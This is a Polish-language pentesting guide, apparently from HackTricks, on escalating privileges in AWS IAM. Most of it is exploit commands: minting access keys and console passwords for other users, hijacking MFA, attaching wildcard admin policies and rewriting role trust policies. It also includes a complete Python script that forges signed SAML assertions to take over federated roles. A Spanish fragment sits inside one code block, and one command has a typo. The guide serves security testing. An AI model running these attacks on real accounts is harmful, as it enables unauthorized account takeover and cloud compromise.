# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Aby uzyskać więcej informacji o IAM, zobacz:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Umożliwia utworzenie nowej wersji polityki IAM, omijając wymóg posiadania uprawnienia `iam:SetDefaultPolicyVersion` poprzez użycie flagi `--set-as-default`. Pozwala to na zdefiniowanie niestandardowych uprawnień.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Wpływ:** Bezpośrednio eskaluje uprawnienia, umożliwiając wykonanie dowolnej akcji na dowolnym zasobie.

### **`iam:SetDefaultPolicyVersion`**

Pozwala zmienić domyślną wersję polityki IAM na inną istniejącą wersję, co może prowadzić do eskalacji uprawnień, jeśli nowa wersja ma więcej uprawnień.

**Polecenie Bash:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Wpływ:** Pośrednie privilege escalation przez umożliwienie dodatkowych uprawnień.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Umożliwia tworzenie access key ID i secret access key dla innego użytkownika, co może prowadzić do potencjalnego privilege escalation.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Wpływ:** Bezpośrednia eskalacja uprawnień poprzez przejęcie rozszerzonych uprawnień innego użytkownika.

Zauważ, że użytkownik może mieć utworzone tylko 2 access keys, więc jeśli użytkownik ma już 2 access keys będziesz potrzebować uprawnienia `iam:DeleteAccessKey` aby usunąć jedną z nich, aby móc utworzyć nową:
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

Jeśli możesz utworzyć nowe virtual MFA device i włączyć je dla innego użytkownika, możesz efektywnie zarejestrować własne MFA dla tego użytkownika, a następnie zażądać sesji uwierzytelnionej MFA dla jego credentials.

**Wykorzystanie:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Wpływ:** Direct privilege escalation poprzez przejęcie rejestracji MFA użytkownika (a następnie użycie jego uprawnień).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Pozwala na tworzenie lub aktualizację login profile, w tym ustawianie haseł do logowania do AWS Console, co prowadzi do direct privilege escalation.

**Exploit for Creation:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Exploit dla Update:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Wpływ:** Bezpośrednia eskalacja uprawnień poprzez zalogowanie się jako dowolny użytkownik.

### **`iam:UpdateAccessKey`**

Pozwala na ponowne włączenie wyłączonego klucza dostępu, co może prowadzić do nieautoryzowanego dostępu, jeśli atakujący posiada ten wyłączony klucz.

**Wykorzystanie:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Wpływ:** Bezpośrednia eskalacja uprawnień poprzez reaktywację kluczy dostępu.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Pozwala na generowanie lub resetowanie poświadczeń dla konkretnych usług AWS (najczęściej **CodeCommit**). To **nie** są klucze API AWS: są to poświadczenia **username/password** dla konkretnej usługi i możesz ich używać tylko tam, gdzie dana usługa je akceptuje.

**Tworzenie:**
```bash
aws iam create-service-specific-credential --user-name <target_user> --service-name codecommit.amazonaws.com
```
Zapisz:

- `ServiceSpecificCredential.ServiceUserName`
- `ServiceSpecificCredential.ServicePassword`

**Przykład:**
```bash
# Find a repository you can access as the target
aws codecommit list-repositories

export REPO_NAME="<repo_name>"
export AWS_REGION="us-east-1" # adjust if needed

# Git URL (HTTPS)
export CLONE_URL="https://git-codecommit.${AWS_REGION}.amazonaws.com/v1/repos/${REPO_NAME}"

# Clone and use the ServiceUserName/ServicePassword when prompted
git clone "$CLONE_URL"
cd "$REPO_NAME"
```
> Uwaga: hasło usługi często zawiera znaki takie jak `+`, `/` i `=`. Najłatwiej jest użyć interaktywnego promptu. Jeśli osadzasz je w URL, najpierw zakoduj je w formacie URL.

W tym momencie możesz odczytać wszystko, do czego użytkownik docelowy ma dostęp w CodeCommit (e.g., a leaked credentials file). Jeśli pobierzesz **AWS access keys** z repo, skonfiguruj nowy profil AWS CLI z tymi kluczami, a następnie uzyskaj dostęp do zasobów (na przykład odczytaj flagę z Secrets Manager):
```bash
aws secretsmanager get-secret-value --secret-id <secret_name> --profile <new_profile>
```
**Resetowanie:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Impact:** Privilege escalation do uprawnień docelowego użytkownika dla danego serwisu (a potencjalnie dalej, jeśli pivotujesz, używając danych pobranych z tego serwisu).

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Pozwala na dołączanie polityk do użytkowników lub grup, bezpośrednio escalating privileges poprzez dziedziczenie uprawnień dołączonej polityki.

**Exploit for User:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit dla grupy:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Impact:** Bezpośrednia eskalacja uprawnień do wszystkiego, co przyznaje dana polityka.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Pozwala na dołączanie lub przypisywanie polityk do ról, użytkowników lub grup, umożliwiając bezpośrednią eskalację uprawnień przez przyznanie dodatkowych uprawnień.

**Eksploatacja dla roli:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Exploit dla Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Możesz użyć polityki takiej jak:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Wpływ:** Bezpośrednie privilege escalation poprzez dodanie uprawnień za pomocą polityk.

### **`iam:AddUserToGroup`**

Umożliwia dodanie siebie do grupy IAM, escalating privileges poprzez dziedziczenie uprawnień grupy.

**Exploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Wpływ:** Bezpośrednia eskalacja uprawnień do poziomu uprawnień grupy.

### **`iam:UpdateAssumeRolePolicy`**

Pozwala na modyfikację dokumentu assume role policy przypisanego do roli, umożliwiając jej assume i uzyskanie związanych z nią uprawnień.

**Eksploit:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Jeżeli polityka wygląda następująco i daje użytkownikowi uprawnienie do przyjęcia roli:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Wpływ:** Bezpośrednia eskalacja uprawnień przez przyjęcie uprawnień dowolnej roli.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Pozwala na przesłanie publicznego klucza SSH w celu uwierzytelnienia do CodeCommit oraz dezaktywację urządzeń MFA, co może prowadzić do pośredniej eskalacji uprawnień.

**Exploit for SSH Key Upload:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit do dezaktywacji MFA:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Impact:** Pośrednia eskalacja uprawnień przez umożliwienie dostępu do CodeCommit lub wyłączenie ochrony MFA.

### **`iam:ResyncMFADevice`**

Pozwala na ponowną synchronizację urządzenia MFA, co może prowadzić do pośredniej eskalacji uprawnień poprzez manipulację ochroną MFA.

**Polecenie Bash:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Wpływ:** Pośrednia eskalacja uprawnień przez dodanie lub manipulację urządzeniami MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Dzięki tym uprawnieniom możesz **zmienić metadane XML połączenia SAML**. Następnie możesz nadużyć **federacji SAML**, aby się **zalogować** jako dowolna **rola, która jej ufa**.

Zauważ, że robiąc to **uprawnieni użytkownicy nie będą mogli się zalogować**. Możesz jednak pobrać XML, wstawić własny, zalogować się i przywrócić poprzednią konfigurację.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
**Atak end-to-end:**

1. Wypisz dostawcę SAML i rolę, która mu ufa:
```bash
export AWS_REGION=${AWS_REGION:-us-east-1}

aws iam list-saml-providers
export PROVIDER_ARN="arn:aws:iam::<ACCOUNT_ID>:saml-provider/<PROVIDER_NAME>"

# Backup current metadata so you can restore it later:
aws iam get-saml-provider --saml-provider-arn "$PROVIDER_ARN" > /tmp/saml-provider-backup.json

# Find candidate roles and inspect their trust policy to confirm they allow sts:AssumeRoleWithSAML:
aws iam list-roles | grep -i saml || true
aws iam get-role --role-name "<ROLE_NAME>"
export ROLE_ARN="arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>"
```
2. Sfałszuj metadane IdP i podpisane oświadczenie SAML dla pary role/provider:
```bash
python3 -m venv /tmp/saml-federation-venv
source /tmp/saml-federation-venv/bin/activate
pip install lxml signxml

# Create /tmp/saml_forge.py from the expandable below first:
python3 /tmp/saml_forge.py --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" > /tmp/saml-forge.json
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-forge.json","r"))
open("/tmp/saml-metadata.xml","w").write(j["metadata_xml"])
open("/tmp/saml-assertion.b64","w").write(j["assertion_b64"])
print("Wrote /tmp/saml-metadata.xml and /tmp/saml-assertion.b64")
PY
```
<details>
<summary>Rozwijane: <code>/tmp/saml_forge.py</code> skrypt pomocniczy (metadane + podpisane oświadczenie)</summary>
```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import datetime as dt
import json
import os
import subprocess
import tempfile
import uuid

from lxml import etree
from signxml import XMLSigner, methods


def _run(cmd: list[str]) -> str:
p = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
return p.stdout


def _openssl_make_key_and_cert(tmpdir: str) -> tuple[str, str]:
key_path = os.path.join(tmpdir, "key.pem")
cert_path = os.path.join(tmpdir, "cert.pem")
_run(
[
"openssl",
"req",
"-x509",
"-newkey",
"rsa:2048",
"-keyout",
key_path,
"-out",
cert_path,
"-days",
"3650",
"-nodes",
"-subj",
"/CN=attacker-idp",
]
)
return key_path, cert_path


def _pem_cert_to_b64(cert_pem: str) -> str:
lines: list[str] = []
for line in cert_pem.splitlines():
if "BEGIN CERTIFICATE" in line or "END CERTIFICATE" in line:
continue
line = line.strip()
if line:
lines.append(line)
return "".join(lines)


def make_metadata_xml(cert_b64: str) -> str:
return f"""<?xml version="1.0"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://attacker.invalid/idp">
<IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
<KeyDescriptor use="signing">
<KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
<X509Data>
<X509Certificate>{cert_b64}</X509Certificate>
</X509Data>
</KeyInfo>
</KeyDescriptor>
<SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://attacker.invalid/sso"/>
</IDPSSODescriptor>
</EntityDescriptor>
"""


def make_signed_saml_response(role_arn: str, principal_arn: str, key_pem: str, cert_pem: str) -> bytes:
ns = {
"saml2p": "urn:oasis:names:tc:SAML:2.0:protocol",
"saml2": "urn:oasis:names:tc:SAML:2.0:assertion",
}

issue_instant = dt.datetime.now(dt.timezone.utc)
not_before = issue_instant - dt.timedelta(minutes=2)
not_on_or_after = issue_instant + dt.timedelta(minutes=10)

resp_id = "_" + str(uuid.uuid4())
assertion_id = "_" + str(uuid.uuid4())

response = etree.Element(etree.QName(ns["saml2p"], "Response"), nsmap=ns)
response.set("ID", resp_id)
response.set("Version", "2.0")
response.set("IssueInstant", issue_instant.isoformat())
response.set("Destination", "https://signin.aws.amazon.com/saml")

issuer = etree.SubElement(response, etree.QName(ns["saml2"], "Issuer"))
issuer.text = "https://attacker.invalid/idp"

status = etree.SubElement(response, etree.QName(ns["saml2p"], "Status"))
status_code = etree.SubElement(status, etree.QName(ns["saml2p"], "StatusCode"))
status_code.set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

assertion = etree.SubElement(response, etree.QName(ns["saml2"], "Assertion"))
assertion.set("ID", assertion_id)
assertion.set("Version", "2.0")
assertion.set("IssueInstant", issue_instant.isoformat())

a_issuer = etree.SubElement(assertion, etree.QName(ns["saml2"], "Issuer"))
a_issuer.text = "https://attacker.invalid/idp"

subject = etree.SubElement(assertion, etree.QName(ns["saml2"], "Subject"))
name_id = etree.SubElement(subject, etree.QName(ns["saml2"], "NameID"))
name_id.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified")
name_id.text = "attacker"

subject_conf = etree.SubElement(subject, etree.QName(ns["saml2"], "SubjectConfirmation"))
subject_conf.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
subject_conf_data = etree.SubElement(subject_conf, etree.QName(ns["saml2"], "SubjectConfirmationData"))
subject_conf_data.set("NotOnOrAfter", not_on_or_after.isoformat())
subject_conf_data.set("Recipient", "https://signin.aws.amazon.com/saml")

conditions = etree.SubElement(assertion, etree.QName(ns["saml2"], "Conditions"))
conditions.set("NotBefore", not_before.isoformat())
conditions.set("NotOnOrAfter", not_on_or_after.isoformat())

audience_restriction = etree.SubElement(conditions, etree.QName(ns["saml2"], "AudienceRestriction"))
audience = etree.SubElement(audience_restriction, etree.QName(ns["saml2"], "Audience"))
audience.text = "https://signin.aws.amazon.com/saml"

attr_stmt = etree.SubElement(assertion, etree.QName(ns["saml2"], "AttributeStatement"))

attr_role = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_role.set("Name", "https://aws.amazon.com/SAML/Attributes/Role")
attr_role_value = etree.SubElement(attr_role, etree.QName(ns["saml2"], "AttributeValue"))
attr_role_value.text = f"{role_arn},{principal_arn}"

attr_session = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_session.set("Name", "https://aws.amazon.com/SAML/Attributes/RoleSessionName")
attr_session_value = etree.SubElement(attr_session, etree.QName(ns["saml2"], "AttributeValue"))
attr_session_value.text = "saml-session"

key_bytes = open(key_pem, "rb").read()
cert_bytes = open(cert_pem, "rb").read()

signer = XMLSigner(
method=methods.enveloped,
signature_algorithm="rsa-sha256",
digest_algorithm="sha256",
c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
)
signed_assertion = signer.sign(
assertion,
key=key_bytes,
cert=cert_bytes,
reference_uri=f"#{assertion_id}",
id_attribute="ID",
)

response.remove(assertion)
response.append(signed_assertion)

return etree.tostring(response, xml_declaration=True, encoding="utf-8")


def main() -> None:
ap = argparse.ArgumentParser()
ap.add_argument("--role-arn", required=True)
ap.add_argument("--principal-arn", required=True)
args = ap.parse_args()

with tempfile.TemporaryDirectory() as tmp:
key_path, cert_path = _openssl_make_key_and_cert(tmp)
cert_pem = open(cert_path, "r", encoding="utf-8").read()
cert_b64 = _pem_cert_to_b64(cert_pem)

metadata_xml = make_metadata_xml(cert_b64)
saml_xml = make_signed_saml_response(args.role_arn, args.principal_arn, key_path, cert_path)
saml_b64 = base64.b64encode(saml_xml).decode("ascii")

print(json.dumps({"metadata_xml": metadata_xml, "assertion_b64": saml_b64}))


if __name__ == "__main__":
main()
```
</details>

3. Zaktualizuj metadane dostawcy SAML do certyfikatu IdP, przejmij rolę i użyj zwróconych poświadczeń STS:
```bash
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata.xml

# Assertion is base64 and can be long. Keep it on one line:
ASSERTION_B64=$(tr -d '\n' </tmp/saml-assertion.b64)
SESSION_LINE=$(aws sts assume-role-with-saml --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" --saml-assertion "$ASSERTION_B64" \
--query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken,Expiration]' --output text)
IFS=$'\t' read -r SESSION_AK SESSION_SK SESSION_ST SESSION_EXP <<<"$SESSION_LINE"
echo "Session expires at: $SESSION_EXP"

# Use creds inline (no need to create an AWS CLI profile):
AWS_ACCESS_KEY_ID="$SESSION_AK" AWS_SECRET_ACCESS_KEY="$SESSION_SK" AWS_SESSION_TOKEN="$SESSION_ST" AWS_REGION="$AWS_REGION" \
aws sts get-caller-identity
```
4. Sprzątanie: przywróć poprzednie metadane:
```bash
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-provider-backup.json","r"))
open("/tmp/saml-metadata-original.xml","w").write(j["SAMLMetadataDocument"])
PY
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata-original.xml
```
> [!WARNING]
> Aktualizacja metadanych dostawcy SAML jest zakłócająca: dopóki Twoje metadane są wdrożone, prawidłowi użytkownicy SSO mogą nie być w stanie się uwierzytelnić.

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Niepewne) Jeśli atakujący ma te **uprawnienia**, mógłby dodać nowy **Thumbprint**, aby móc zalogować się do wszystkich ról ufających temu dostawcy.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

To uprawnienie pozwala atakującemu zaktualizować permissions boundary użytkownika, potencjalnie eskalując ich uprawnienia poprzez umożliwienie wykonywania akcji, które normalnie są ograniczone przez ich istniejące uprawnienia.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

Podmiot posiadający iam:PutRolePermissionsBoundary może ustawić permissions boundary na istniejącej roli. Ryzyko pojawia się, gdy ktoś z tym uprawnieniem zmienia permissions boundary roli: może niewłaściwie ograniczyć operacje (powodując zakłócenia w działaniu usług) lub, jeśli przypisze zbyt permisywny permissions boundary, skutecznie rozszerzyć możliwości roli i eskalować uprawnienia.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Źródła

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
